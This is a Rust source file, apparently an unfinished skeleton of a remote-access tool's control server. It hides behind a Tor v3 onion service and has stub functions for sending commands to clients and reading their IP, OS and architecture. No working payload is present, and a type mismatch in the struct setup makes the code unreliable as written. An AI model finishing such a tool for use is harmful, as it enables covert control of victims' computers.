extern crate libc;

use dirs;
use libc::{ c_char, c_void };
use libtor::{ Tor, TorFlag, HiddenServiceVersion, TorAddress, log, Error };
use portpicker::pick_unused_port;
use std::ffi::CString;
use std::fmt::{ format };
use std::fs::{ File };
use std::io::{ Read, Write };
use std::net::{ TcpListener, TcpStream, SocketAddr };
use std::thread::{ spawn, JoinHandle };

// this makes write work on socket
#[allow(unused)] use std::io::prelude::*;

/// get the current setings dir (which has tor stuff in it)
pub fn location() -> String {
  return format!("{}/rattata", dirs::config_dir().unwrap().into_os_string().into_string().unwrap());
}

/// handle an incoming request
fn handle_client(mut stream: TcpStream) {
  // TODO: actual server here
  println!("connect");
  let content = "<h1>Howdy, Hacker!</h1>";
  let _ = stream.write(format(format_args!("HTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: {}\nConnection: close\n\n{}", content.len(), content)).as_bytes());
}


struct RattataThreads {
  tor: JoinHandle<std::result::Result<u8, libtor::Error>>,
  socket: JoinHandle<()>
}

#[repr(C)]
pub struct Rattata {
  pub hostname: *const c_char,
  pub clients: [u16; 255],
  pub port: u16,
  threads: RattataThreads
}

#[repr(C)]
pub struct Client {
  pub id: u16,
  pub ip: *const c_char,
  pub os: *const c_char,
  pub arch: *const c_char
}

/// start a server on a specific port
#[no_mangle]
pub extern "C" fn rattata_new (port: u16) -> *mut Rattata {
  let mut realport = port;
  
  if realport == 0 {
    realport = pick_unused_port().unwrap();
  }

  let socket = spawn(move || {
      let listener = TcpListener::bind(SocketAddr::from(([0, 0, 0, 0], realport))).unwrap();
      for stream in listener.incoming() {
          handle_client(stream.unwrap());
      }
  });
  
  let tor = Tor::new()
    .flag(TorFlag::SocksPort(0)) // no socks proxy started
    .flag(TorFlag::HiddenServiceDir(location()))
    .flag(TorFlag::HiddenServiceVersion(HiddenServiceVersion::V3))
    .flag(TorFlag::HiddenServicePort(TorAddress::Port(realport), None.into()))
    .flag(TorFlag::Log(log::LogLevel::Err))
    .start_background();
  
    return Box::into_raw(Box::new(Rattata {
    hostname: CString::new("").expect("Error: CString::new()").into_raw(),
    clients: [0; 255],
    port: realport,
    threads: Box::into_raw(Box::new(RattataThreads{
      tor: tor,
      socket: socket
    })).cast::<c_void>()
  }));
}

/// stop running server
#[no_mangle]
pub extern "C" fn rattata_free (ptr: *mut Rattata) {
  if ptr.is_null() {
    return;
  }
  unsafe {
    Box::from_raw(ptr);
  }
}

/// send a command to a specific client
#[no_mangle]
pub extern "C" fn rattata_command (ptr: *mut Rattata, client_id: u16, command: *const c_char, args: *const c_char) -> *const c_char {
  // XXX: dummy
  return CString::new("").expect("Error: CString::new()").into_raw();
}

/// get info about a specific client
#[no_mangle]
pub extern "C" fn rattata_info (ptr: *mut Rattata, client_id: u16) -> *mut Client {
  // XXX: dummy
  return Box::into_raw(Box::new(Client {
    id: client_id,
    ip: CString::new("").expect("Error: CString::new()").into_raw(),
    os: CString::new("").expect("Error: CString::new()").into_raw(),
    arch: CString::new("").expect("Error: CString::new()").into_raw(),
  }));
}